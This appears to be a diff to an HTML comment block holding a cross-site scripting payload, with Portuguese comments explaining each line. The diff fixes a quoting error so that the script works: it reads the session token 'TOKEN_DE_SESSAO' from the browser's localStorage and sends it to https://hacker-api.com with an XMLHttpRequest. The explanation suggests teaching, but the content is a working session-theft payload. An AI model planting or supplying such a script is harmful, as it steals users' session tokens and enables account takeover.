@@ -1,10 +1,22 @@
+<!-- Esta é uma div com a classe "comentario" -->
 <div class = "comentario">
+    <!-- Dentro da div, temos um parágrafo -->
     <p>
+        <!-- Dentro do parágrafo, temos um script JavaScript -->
         <script>
+            // A variável 'token' está recebendo o valor de 'TOKEN_DE_SESSAO' do armazenamento local do navegador
             var token = localStorage.getItem('TOKEN_DE_SESSAO');
-            var url = https://hacker-api.com/?token=' + token;
+            
+            // A variável 'url' está sendo definida como uma URL que inclui o token como um parâmetro
+            var url = 'https://hacker-api.com/?token=' + token;
+            
+            // Um novo objeto XMLHttpRequest é criado e atribuído à variável 'xhttp'
             var xhttp = new XMLHttpRequest();
+            
+            // Uma requisição GET é aberta usando a URL definida anteriormente
             xhttp.open('GET', url, true);
+            
+            // A requisição é enviada
             xhttp.send();
         </script>
     </p>
